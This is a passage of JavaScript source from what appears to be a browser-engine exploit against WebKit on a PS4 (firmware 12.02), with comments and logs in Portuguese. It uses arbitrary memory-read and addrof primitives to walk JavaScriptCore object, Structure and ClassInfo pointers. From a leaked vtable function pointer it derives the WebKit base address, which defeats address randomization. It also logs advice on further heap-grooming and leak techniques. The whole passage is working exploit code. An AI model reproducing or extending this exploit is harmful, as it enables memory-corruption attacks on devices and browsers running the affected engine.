                throw new Error("Structure* poluído/inválido para ClassInfo leak.");
            }
            logS3(`    Lido Structure* do objeto alvo: ${structure_addr.toString(true)}`, "leak");

            const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
            const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
            const class_info_addr = arb_read_final(class_info_ptr_addr);
            if (class_info_addr.equals(NEW_POLLUTION_VALUE) || class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
                throw new Error("ClassInfo* poluído/inválido para ClassInfo leak.");
            }
            logS3(`    Lido ClassInfo* da Structure: ${class_info_addr.toString(true)}`, "leak");

            const M_CACHED_TYPE_INFO_OFFSET = LOCAL_JSC_OFFSETS.ClassInfo_M_CACHED_TYPE_INFO_OFFSET;
            const cached_type_info_ptr_addr = class_info_addr.add(M_CACHED_TYPE_INFO_OFFSET);
            const cached_type_info_addr = arb_read_final(cached_type_info_ptr_addr);
            if (cached_type_info_addr.equals(NEW_POLLUTION_VALUE) || cached_type_info_addr.equals(AdvancedInt64.Zero) || cached_type_info_addr.equals(AdvancedInt64.NaNValue)) {
                throw new Error("m_cachedTypeInfo poluído/inválido.");
            }
            logS3(`    Lido m_cachedTypeInfo do ClassInfo: ${cached_type_info_addr.toString(true)}`, "leak");

            const is_sane_typeinfo_ptr = cached_type_info_addr.high() > 0x40000000;
            if (!is_sane_typeinfo_ptr) {
                throw new Error(`Ponteiro m_cachedTypeInfo (${cached_type_info_addr.toString(true)}) não parece um endereço de heap válido.`);
            }

            logS3(`++++++++++++ VAZAMENTO DE JSC::ClassInfo::m_cachedTypeInfo BEM SUCEDIDO! ++++++++++++`, "vuln");
            final_result.webkit_leak_details = {
                success: true,
                msg: `Endereço de JSC::ClassInfo::m_cachedTypeInfo vazado com sucesso: ${cached_type_info_addr.toString(true)}`,
                webkit_base_candidate: "Necessita engenharia reversa para offset",
                js_object_put_addr: "N/A"
            };
            return final_result;
        } catch (classinfo_leak_e) {
            logS3(`  Falha na tentativa de vazamento com JSC::ClassInfo::m_cachedTypeInfo: ${classinfo_leak_e.message}`, "warn");
        }

        throw new Error("Nenhuma estratégia de vazamento de WebKit foi bem-sucedida após Heap Grooming e testes múltiplos.");

    } catch (e) {
        final_result.message = `Exceção na implementação funcional: ${e.message}\n${e.stack || ''}`;
        logS3(final_result.message, "critical");
        final_result.success = false;
        final_result.webkit_leak_details.success = false;
        final_result.webkit_leak_details.msg = `Vazamento WebKit não foi possível devido a erro na fase anterior: ${e.message}`;
    }

    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Concluído ---`, "test");
    if (!final_result.webkit_leak_details.success) {
        logS3("========== SUGESTÃO DE DEPURAGEM CRÍTICA ==========", "critical");
        logS3("As primitivas de L/E estão funcionando, mas o vazamento do WebKit falhou consistentemente devido à leitura de valores de poluição.", "critical");
        logS3("Isso indica um problema de reutilização de heap ou alocação previsível no PS4 12.02, que o Heap Feng Shui não conseguiu contornar.", "critical");
        logS3("RECOMENDAÇÃO: Com o depurador inacessível, a estratégia é iterar em técnicas mais variadas de Heap Grooming e fontes de vazamento.", "critical");
        logS3("Concentre-se em: 1) Mais variação de alocações/liberações no grooming. 2) Vazamento de m_data de TypedArray. 3) Vazamento de endereços de funções nativas JS (JSCFunction/Executable).", "critical");
        logS3("É crucial tentar entender o layout do heap através de padrões de sucesso/falha e ajustar os tamanhos de alocação.", "critical");
        logS3("======================================================", "critical");
    }

    return {
        errorOccurred: (final_result.success && final_result.webkit_leak_details.success) ? null : final_result.message,
        addrof_result: { success: final_result.success, msg: "Primitiva addrof funcional." },
        webkit_leak_result: final_result.webkit_leak_details,
        heisenbug_on_M2_in_best_result: (final_result.success && final_result.webkit_leak_details.success),
        oob_value_of_best_result: 'N/A (Estratégia Uncaged)',
        tc_probe_details: { strategy: 'Uncaged Self-Contained R/W (Verified + WebKit Leak Isolation Diagnostic)' }
    };
}

// =======================================================================================
// Função Auxiliar para tentar vazamento a partir da Structure de um objeto dado
// =======================================================================================
async function performLeakAttemptFromObjectStructure(obj_addr, obj_type_name, arb_read_func, final_result_ref, pollution_value, LOCAL_JSC_OFFSETS, WEBKIT_LIBRARY_INFO) {
    logS3(`  Iniciando leituras da JSCell/Structure do objeto de vazamento tipo "${obj_type_name}"...`, "debug");

    try {
        const JSC_CELL_STRUCTURE_POINTER_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_POINTER_OFFSET;
        const structure_ptr_addr = obj_addr.add(JSC_CELL_STRUCTURE_POINTER_OFFSET);
        const structure_addr = arb_read_func(structure_ptr_addr);
        logS3(`    Lido Structure* (${JSC_CELL_STRUCTURE_POINTER_OFFSET}): ${structure_addr.toString(true)} de ${structure_ptr_addr.toString(true)}`, "leak");
        
        if (structure_addr.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: Structure* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("Structure* poluído.");
        }
        if (structure_addr.equals(AdvancedInt64.Zero) || structure_addr.equals(AdvancedInt64.NaNValue)) {
            throw new Error("Falha ao vazar Structure* (endereço é 0x0 ou NaN).");
        }
        if (structure_addr.high() < 0x40000000) logS3(`    ALERTA: Structure* (${structure_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de estrutura real.`, "warn");

        const JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_STRUCTURE_ID_FLATTENED_OFFSET;
        const structure_id_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET));
        const structure_id_byte = structure_id_flattened_val.low() & 0xFF;
        logS3(`    Lido StructureID_Flattened (${JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET}): ${toHex(structure_id_byte, 8)} de ${obj_addr.add(JSC_CELL_STRUCTURE_ID_FLATTENED_OFFSET).toString(true)} (Valor Full: ${structure_id_flattened_val.toString(true)})`, "leak");
        if (structure_id_flattened_val.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: StructureID_Flattened está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("StructureID_Flattened poluído.");
        }

        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID !== null &&
            obj_type_name.includes("JS Object") &&
            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID) {
            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado JSObject_Simple_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.JSObject_Simple_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
        }
        if (JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID !== null &&
            obj_type_name.includes("ArrayBuffer") &&
            structure_id_byte !== JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID) {
            logS3(`    ALERTA: StructureID (${toHex(structure_id_byte, 8)}) não corresponde ao esperado ArrayBuffer_STRUCTURE_ID (${toHex(JSC_OFFSETS.ArrayBuffer.KnownStructureIDs.ArrayBuffer_STRUCTURE_ID, 8)}) para ${obj_type_name}.`, "warn");
        }

        const JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET = LOCAL_JSC_OFFSETS.JSCell_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET;
        const typeinfo_type_flattened_val = arb_read_func(obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET));
        const typeinfo_type_byte = typeinfo_type_flattened_val.low() & 0xFF;
        logS3(`    Lido CELL_TYPEINFO_TYPE_FLATTENED (${JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET}): ${toHex(typeinfo_type_byte, 8)} de ${obj_addr.add(JSC_CELL_TYPEINFO_TYPE_FLATTENED_OFFSET).toString(true)} (Valor Full: ${typeinfo_type_flattened_val.toString(true)})`, "leak");
        if (typeinfo_type_flattened_val.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: CELL_TYPEINFO_TYPE_FLATTENED está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("CELL_TYPEINFO_TYPE_FLATTENED poluído.");
        }


        // 2. LEITURAS DA STRUCTURE
        logS3(`  Iniciando leituras da Structure para "${obj_type_name}"...`, "debug");
        await PAUSE_S3(50);
        
        const STRUCTURE_CLASS_INFO_OFFSET = LOCAL_JSC_OFFSETS.Structure_CLASS_INFO_OFFSET;
        const class_info_ptr_addr = structure_addr.add(STRUCTURE_CLASS_INFO_OFFSET);
        const class_info_addr = arb_read_func(class_info_ptr_addr);
        logS3(`    Lido ClassInfo* (${STRUCTURE_CLASS_INFO_OFFSET}): ${class_info_addr.toString(true)} de ${class_info_ptr_addr.toString(true)}`, "leak");
        if (class_info_addr.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: ClassInfo* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("ClassInfo* poluído.");
        }
        if (class_info_addr.equals(AdvancedInt64.Zero) || class_info_addr.equals(AdvancedInt64.NaNValue)) {
            throw new Error("Falha ao vazar ClassInfo* (endereço é 0x0 ou NaN).");
        }
        if (class_info_addr.high() < 0x40000000) logS3(`    ALERTA: ClassInfo* (${class_info_addr.toString(true)}) parece um endereço baixo (Smi?), o que é incomum para um ponteiro de ClassInfo real.`, "warn");

        const STRUCTURE_GLOBAL_OBJECT_OFFSET = LOCAL_JSC_OFFSETS.Structure_GLOBAL_OBJECT_OFFSET;
        const global_object_ptr_addr = structure_addr.add(STRUCTURE_GLOBAL_OBJECT_OFFSET);
        const global_object_addr = arb_read_func(global_object_ptr_addr);
        logS3(`    Lido GlobalObject* (${STRUCTURE_GLOBAL_OBJECT_OFFSET}): ${global_object_addr.toString(true)} de ${global_object_ptr_addr.toString(true)}`, "leak");
        if (global_object_addr.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: GlobalObject* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("GlobalObject* poluído.");
        }
        if (global_object_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: GlobalObject* é 0x0.`, "warn");

        const STRUCTURE_PROTOTYPE_OFFSET = LOCAL_JSC_OFFSETS.Structure_PROTOTYPE_OFFSET;
        const prototype_ptr_addr = structure_addr.add(STRUCTURE_PROTOTYPE_OFFSET);
        const prototype_addr = arb_read_func(prototype_ptr_addr);
        logS3(`    Lido Prototype* (${STRUCTURE_PROTOTYPE_OFFSET}): ${prototype_addr.toString(true)} de ${prototype_ptr_addr.toString(true)}`, "leak");
        if (prototype_addr.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: Prototype* está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("Prototype* poluído.");
        }
        if (prototype_addr.equals(AdvancedInt64.Zero)) logS3(`    AVISO: Prototype* é 0x0.`, "warn");

        const STRUCTURE_AGGREGATED_FLAGS_OFFSET = LOCAL_JSC_OFFSETS.Structure_AGGREGATED_FLAGS_OFFSET;
        const aggregated_flags_addr = structure_addr.add(STRUCTURE_AGGREGATED_FLAGS_OFFSET);
        const aggregated_flags_val = arb_read_func(aggregated_flags_addr);
        logS3(`    Lido AGGREGATED_FLAGS (${STRUCTURE_AGGREGATED_FLAGS_OFFSET}): ${aggregated_flags_val.toString(true)} de ${aggregated_flags_addr.toString(true)}`, "leak");
        if (aggregated_flags_val.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: AGGREGATED_FLAGS está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("AGGREGATED_FLAGS poluído.");
        }

        await PAUSE_S3(50);

        // 3. Leitura do ponteiro JSC::JSObject::put da vtable da Structure
        const STRUCTURE_VIRTUAL_PUT_OFFSET = LOCAL_JSC_OFFSETS.Structure_VIRTUAL_PUT_OFFSET;
        const js_object_put_func_ptr_addr_in_structure = structure_addr.add(STRUCTURE_VIRTUAL_PUT_OFFSET);
        logS3(`  Tentando ler ponteiro de JSC::JSObject::put de ${js_object_put_func_ptr_addr_in_structure.toString(true)} (Structure*+${toHex(STRUCTURE_VIRTUAL_PUT_OFFSET)}) para "${obj_type_name}"`, "debug");
        const js_object_put_func_addr = arb_read_func(js_object_put_func_ptr_addr_in_structure);
        logS3(`  Lido Endereço de JSC::JSObject::put: ${js_object_put_func_addr.toString(true)}`, "leak");

        if (js_object_put_func_addr.equals(pollution_value)) {
            logS3(`    ALERTA DE POLUIÇÃO: JSC::JSObject::put está lendo o valor de poluição (${pollution_value.toString(true)}).`, "warn");
            throw new Error("JSC::JSObject::put poluído.");
        }
        if (js_object_put_func_addr.equals(AdvancedInt64.Zero) || js_object_put_func_addr.equals(AdvancedInt64.NaNValue)) {
             throw new Error("Falha ao vazar ponteiro para JSC::JSObject::put (endereço é 0x0 ou NaN).");
        }
        if ((js_object_put_func_addr.low() & 1) === 0 && js_object_put_func_addr.high() === 0) {
            logS3(`    ALERTA: Ponteiro para JSC::JSObject::put (${js_object_put_func_addr.toString(true)}) parece ser um Smi ou endereço muito baixo, o que é incomum para um ponteiro de função.`, "warn");
        }


        // 4. Calcular WebKit Base
        const expected_put_offset_str = WEBKIT_LIBRARY_INFO.FUNCTION_OFFSETS["JSC::JSObject::put"];
        if (!expected_put_offset_str) {
            throw new Error("Offset de 'JSC::JSObject::put' não encontrado em WEBKIT_LIBRARY_INFO. FUNCTION_OFFSETS.");
        }
        const expected_put_offset = new AdvancedInt64(parseInt(expected_put_offset_str, 16));
        logS3(`  Offset esperado de JSC::JSObject::put no WebKit: ${expected_put_offset.toString(true)}`, "debug");

        const webkit_base_candidate = js_object_put_func_addr.sub(expected_put_offset);
        logS3(`  Candidato a WebKit Base: ${webkit_base_candidate.toString(true)} (Calculado de JSObject::put)`, "leak");

        // 5. Critério de Sanidade para o Endereço Base
        const is_sane_base = webkit_base_candidate.high() > 0x40000000 && (webkit_base_candidate.low() & 0xFFF) === 0;
        logS3(`  Verificação de Sanidade do WebKit Base: Alto > 0x40000000 e alinhado a 0x1000? ${is_sane_base}`, is_sane_base ? "good" : "warn");

        if (!is_sane_base) {
            throw new Error(`Candidato a WebKit base não passou na verificação de sanidade para ${obj_type_name}.`);
        }

        final_result_ref.webkit_leak_details = {
            success: true,
            msg: `Endereço base do WebKit vazado com sucesso via ${obj_type_name}.`,
            webkit_base_candidate: webkit_base_candidate.toString(true),
            js_object_put_addr: js_object_put_func_addr.toString(true)
        };
        logS3(`++++++++++++ VAZAMENTO WEBKIT SUCESSO via ${obj_type_name}! ++++++++++++`, "vuln");
        return true;
    } catch (leak_attempt_e) {
        logS3(`  Falha na tentativa de vazamento com ${obj_type_name}: ${leak_attempt_e.message}`, "warn");
        return false;
    }
}
